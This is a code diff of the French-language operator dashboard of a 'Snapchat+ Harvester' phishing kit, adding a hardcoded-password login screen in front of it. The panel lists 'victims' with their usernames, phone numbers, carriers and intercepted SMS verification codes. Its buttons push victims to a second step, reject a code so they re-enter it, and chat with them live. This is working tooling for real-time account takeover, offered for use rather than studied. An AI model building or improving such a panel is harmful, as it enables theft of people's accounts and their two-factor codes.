@@ -16,6 +16,45 @@
             min-height: 100vh;
         }
 
+        .login-container {
+            max-width: 420px;
+            margin: 120px auto;
+            padding: 40px 30px;
+            background: #1a1a1a;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #333;
+        }
+
+        .login-container h1 {
+            color: #FFFC00;
+            margin-bottom: 10px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            background: #111;
+            border: 1px solid #444;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 18px;
+            margin: 20px 0;
+            box-sizing: border-box;
+        }
+
+        button {
+            background: #FFFC00;
+            color: #000;
+            font-weight: 600;
+            padding: 14px 32px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+
         .header {
             background: #111;
             padding: 20px 30px;
@@ -75,7 +114,6 @@
         .waiting { background: #8B0000; color: #fff; }
         .code_received { background: #006400; color: #fff; }
         .step2_forced { background: #FF8800; color: #000; }
-        .step3 { background: #00C853; color: #000; }
 
         .actions {
             display: flex;
@@ -97,18 +135,6 @@
         .delete-btn { background: #FF0000; color: #fff; font-size: 16px; min-width: 40px; }
 
         button:hover { filter: brightness(1.15); }
-
-        .log {
-            background: #111;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: monospace;
-            white-space: pre-wrap;
-            max-height: 420px;
-            overflow-y: auto;
-            margin-top: 30px;
-            border: 1px solid #333;
-        }
 
         #adminChat {
             margin-top: 20px;
@@ -172,186 +198,220 @@
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Snapchat+ Harvester — Control Panel</h1>
-        <div>Victimes en ligne : <strong id="liveCount">0</strong></div>
+
+    <!-- LOGIN SCREEN -->
+    <div id="loginScreen">
+        <div class="login-container">
+            <h1>🔐 Control Panel</h1>
+            <p>Accès Administrateur Snapchat+ Harvester</p>
+            <input type="password" id="adminPass" placeholder="Entrez le mot de passe" autocomplete="off">
+            <button onclick="login()">Se Connecter</button>
+            <div id="error" style="color:#ff4444; margin-top:15px; display:none;">Mot de passe incorrect</div>
+        </div>
     </div>
 
-    <div class="container">
-        <input type="text" id="filter" placeholder="Filtrer par Session ID, Username ou Téléphone...">
-
-        <table id="victimsTable">
-            <thead>
-                <tr>
-                    <th>Session ID</th>
-                    <th>Username</th>
-                    <th>Téléphone</th>
-                    <th>Opérateur</th>
-                    <th>Statut</th>
-                    <th>Code SMS</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody></tbody>
-        </table>
-
-        <div id="adminChat">
-            <h3>Chat avec <span id="chatVictimId"></span></h3>
-            <div class="chat-legend">🟡 Jaune = Victime (Utilisateur) | Gris = Admin (toi)</div>
-            <div id="chatMessagesAdmin"></div>
-            <div id="adminChatInput">
-                <input type="text" id="adminMessage" placeholder="Répondre à la victime...">
-                <button onclick="sendAdminMessage()">Envoyer</button>
-            </div>
+    <!-- MAIN PANEL (caché au départ) -->
+    <div id="mainPanel" style="display: none;">
+        <div class="header">
+            <h1>Snapchat+ Harvester — Control Panel</h1>
+            <div>Victimes en ligne : <strong id="liveCount">0</strong></div>
         </div>
 
-        <div class="log" id="liveLog">En attente de victimes...</div>
+        <div class="container">
+            <input type="text" id="filter" placeholder="Filtrer par Session ID, Username ou Téléphone...">
+
+            <table id="victimsTable">
+                <thead>
+                    <tr>
+                        <th>Session ID</th>
+                        <th>Username</th>
+                        <th>Téléphone</th>
+                        <th>Opérateur</th>
+                        <th>Statut</th>
+                        <th>Code SMS</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+
+            <div id="adminChat">
+                <h3>Chat avec <span id="chatVictimId"></span></h3>
+                <div class="chat-legend">🟡 Jaune = Victime (Utilisateur) | Gris = Admin (toi)</div>
+                <div id="chatMessagesAdmin"></div>
+                <div id="adminChatInput">
+                    <input type="text" id="adminMessage" placeholder="Répondre à la victime...">
+                    <button onclick="sendAdminMessage()">Envoyer</button>
+                </div>
+            </div>
+
+            <div class="log" id="liveLog">En attente de victimes...</div>
+        </div>
     </div>
 
     <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
     <script>
+        const PASSWORD = "changeMoi123";   // ← CHANGE ÇA IMMÉDIATEMENT PAR UN MOT DE PASSE FORT !
+
         let victims = [];
         let currentChatSession = null;
-        let socket = io();
+        let socket = null;
 
-        socket.on('connect', () => console.log('✅ Admin Socket.IO connecté'));
-
-        socket.on('command', (data) => {
-            if (data.action === 'chatMessage' && data.from === 'victim') {
-                addAdminChatMessage(data.message, 'victim');
-            }
-        });
-
-        async function loadVictims() {
-            try {
-                const res = await fetch('/api/victims');
-                const newVictims = await res.json();
-                
-                // Fix principal : on ne re-render que si les données ont changé
-                if (JSON.stringify(newVictims) !== JSON.stringify(victims)) {
-                    victims = newVictims;
-                    renderTable(document.getElementById('filter').value);
-                }
-            } catch (e) {
-                console.error("Erreur chargement victimes", e);
-            }
-        }
-
-        function renderTable(filter = '') {
-            const tbody = document.querySelector('#victimsTable tbody');
-            tbody.innerHTML = '';
-            let count = 0;
-
-            const filtered = victims.filter(v =>
-                !filter || 
-                (v.sessionId && v.sessionId.toLowerCase().includes(filter.toLowerCase())) ||
-                (v.username && v.username.toLowerCase().includes(filter.toLowerCase())) ||
-                (v.phone && v.phone.includes(filter))
-            );
-
-            filtered.forEach(v => {
-                count++;
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td><code>${v.sessionId || '-'}</code></td>
-                    <td>${v.username || '-'}</td>
-                    <td>${v.phone || '-'}</td>
-                    <td>${v.operator || '-'}</td>
-                    <td><span class="status ${v.status || 'waiting'}">${getStatusText(v.status)}</span></td>
-                    <td><strong>${v.code || '-'}</strong></td>
-                    <td class="actions">
-                        <button class="action-btn step2-btn" onclick="forceStep2('${v.sessionId}')">▶️ Étape 2</button>
-                        <button class="action-btn chat-toggle-btn" onclick="toggleChat('${v.sessionId}')" style="background:#00C853;color:#000;">💬 Chat</button>
-                        <button class="action-btn" onclick="badCode('${v.sessionId}')" style="background:#FF4444;color:#fff;">Code mauvais</button>
-                        <button class="action-btn delete-btn" onclick="deleteSession('${v.sessionId}', this)">❌</button>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-
-            document.getElementById('liveCount').textContent = count;
-        }
-
-        function getStatusText(status) {
-            if (status === 'waiting') return '⏳ En attente';
-            if (status === 'step2_forced') return '✅ Étape 2';
-            if (status === 'code_received') return '✅ Code reçu';
-            return '⏳ En attente';
-        }
-
-        // Filtre en temps réel
-        document.getElementById('filter').addEventListener('input', (e) => renderTable(e.target.value));
-
-        // === Tes fonctions existantes (inchangées) ===
-        function toggleChat(sessionId) {
-            const chatPanel = document.getElementById('adminChat');
-            if (currentChatSession === sessionId && chatPanel.style.display === 'flex') {
-                chatPanel.style.display = 'none';
-                currentChatSession = null;
+        function login() {
+            const pass = document.getElementById('adminPass').value.trim();
+            if (pass === PASSWORD) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('mainPanel').style.display = 'block';
+                initAdminPanel();
             } else {
-                currentChatSession = sessionId;
-                chatPanel.style.display = 'flex';
-                document.getElementById('chatVictimId').textContent = sessionId;
-                document.getElementById('chatMessagesAdmin').innerHTML = '';
-                if (socket.connected) socket.emit('joinSession', sessionId);
+                const error = document.getElementById('error');
+                error.style.display = 'block';
+                setTimeout(() => error.style.display = 'none', 3000);
             }
         }
 
-        function sendAdminMessage() {
-            const input = document.getElementById('adminMessage');
-            const msg = input.value.trim();
-            if (!msg || !currentChatSession) return;
+        function initAdminPanel() {
+            socket = io();
 
-            socket.emit('chatMessage', { 
-                sessionId: currentChatSession, 
-                message: msg, 
-                from: 'admin' 
+            socket.on('connect', () => console.log('✅ Admin Socket.IO connecté'));
+
+            socket.on('command', (data) => {
+                if (data.action === 'chatMessage' && data.from === 'victim') {
+                    addAdminChatMessage(data.message, 'victim');
+                }
             });
 
-            addAdminChatMessage(msg, 'admin');
-            input.value = '';
-        }
+            async function loadVictims() {
+                try {
+                    const res = await fetch('/api/victims');
+                    const newVictims = await res.json();
+                    
+                    if (JSON.stringify(newVictims) !== JSON.stringify(victims)) {
+                        victims = newVictims;
+                        renderTable(document.getElementById('filter').value);
+                    }
+                } catch (e) {
+                    console.error("Erreur chargement victimes", e);
+                }
+            }
 
-        function addAdminChatMessage(msg, from) {
-            const container = document.getElementById('chatMessagesAdmin');
-            const div = document.createElement('div');
-            div.className = `chat-msg-admin ${from === 'admin' ? 'chat-admin' : 'chat-victim'}`;
-            div.textContent = msg;
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
-        }
+            function renderTable(filter = '') {
+                const tbody = document.querySelector('#victimsTable tbody');
+                tbody.innerHTML = '';
+                let count = 0;
 
-        async function forceStep2(sessionId) {
-            await fetch('/api/force-step2', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
-            loadVictims();
-        }
+                const filtered = victims.filter(v =>
+                    !filter || 
+                    (v.sessionId && v.sessionId.toLowerCase().includes(filter.toLowerCase())) ||
+                    (v.username && v.username.toLowerCase().includes(filter.toLowerCase())) ||
+                    (v.phone && v.phone.includes(filter))
+                );
 
-        async function badCode(sessionId) {
-            await fetch('/api/bad-code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
-            loadVictims();
-        }
-
-        async function deleteSession(sessionId, btn) {
-            if (!confirm(`Supprimer définitivement la session ${sessionId} ?`)) return;
-
-            const row = btn.closest('tr');
-            if (row) row.remove();
-
-            document.getElementById('liveCount').textContent = parseInt(document.getElementById('liveCount').textContent) - 1 || 0;
-            victims = victims.filter(v => v.sessionId !== sessionId);
-
-            try {
-                await fetch('/api/delete-session', { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ sessionId }) 
+                filtered.forEach(v => {
+                    count++;
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td><code>${v.sessionId || '-'}</code></td>
+                        <td>${v.username || '-'}</td>
+                        <td>${v.phone || '-'}</td>
+                        <td>${v.operator || '-'}</td>
+                        <td><span class="status ${v.status || 'waiting'}">${v.status === 'waiting' ? '⏳ En attente' : v.status === 'step2_forced' ? '✅ Étape 2' : '✅ Code reçu'}</span></td>
+                        <td><strong>${v.code || '-'}</strong></td>
+                        <td class="actions">
+                            <button class="action-btn step2-btn" onclick="forceStep2('${v.sessionId}')">▶️ Étape 2</button>
+                            <button class="action-btn chat-toggle-btn" onclick="toggleChat('${v.sessionId}')" style="background:#00C853;color:#000;">💬 Chat</button>
+                            <button class="action-btn" onclick="badCode('${v.sessionId}')" style="background:#FF4444;color:#fff;">Code mauvais</button>
+                            <button class="action-btn delete-btn" onclick="deleteSession('${v.sessionId}', this)">❌</button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
                 });
-            } catch (e) {}
+
+                document.getElementById('liveCount').textContent = count;
+            }
+
+            function toggleChat(sessionId) {
+                const chatPanel = document.getElementById('adminChat');
+                if (currentChatSession === sessionId && chatPanel.style.display === 'flex') {
+                    chatPanel.style.display = 'none';
+                    currentChatSession = null;
+                } else {
+                    currentChatSession = sessionId;
+                    chatPanel.style.display = 'flex';
+                    document.getElementById('chatVictimId').textContent = sessionId;
+                    document.getElementById('chatMessagesAdmin').innerHTML = '';
+                    if (socket && socket.connected) socket.emit('joinSession', sessionId);
+                }
+            }
+
+            function sendAdminMessage() {
+                const input = document.getElementById('adminMessage');
+                const msg = input.value.trim();
+                if (!msg || !currentChatSession) return;
+
+                socket.emit('chatMessage', { 
+                    sessionId: currentChatSession, 
+                    message: msg, 
+                    from: 'admin' 
+                });
+
+                addAdminChatMessage(msg, 'admin');
+                input.value = '';
+            }
+
+            function addAdminChatMessage(msg, from) {
+                const container = document.getElementById('chatMessagesAdmin');
+                const div = document.createElement('div');
+                div.className = `chat-msg-admin ${from === 'admin' ? 'chat-admin' : 'chat-victim'}`;
+                div.textContent = msg;
+                container.appendChild(div);
+                container.scrollTop = container.scrollHeight;
+            }
+
+            async function forceStep2(sessionId) {
+                await fetch('/api/force-step2', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
+                loadVictims();
+            }
+
+            async function badCode(sessionId) {
+                await fetch('/api/bad-code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) });
+                loadVictims();
+            }
+
+            async function deleteSession(sessionId, btn) {
+                if (!confirm(`Supprimer définitivement la session ${sessionId} ?`)) return;
+
+                const row = btn.closest('tr');
+                if (row) row.remove();
+
+                document.getElementById('liveCount').textContent = parseInt(document.getElementById('liveCount').textContent) - 1 || 0;
+                victims = victims.filter(v => v.sessionId !== sessionId);
+
+                try {
+                    await fetch('/api/delete-session', { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify({ sessionId }) 
+                    });
+                } catch (e) {}
+            }
+
+            // Events
+            document.getElementById('filter').addEventListener('input', (e) => renderTable(e.target.value));
+
+            // Lancement
+            setInterval(loadVictims, 1500);
+            loadVictims();
         }
 
-        // Lancement
-        setInterval(loadVictims, 1500);
-        window.onload = loadVictims;
+        // Permettre Entrée sur le champ mot de passe
+        document.addEventListener('DOMContentLoaded', () => {
+            const passInput = document.getElementById('adminPass');
+            passInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') login();
+            });
+            passInput.focus();
+        });
     </script>
 </body>
 </html>
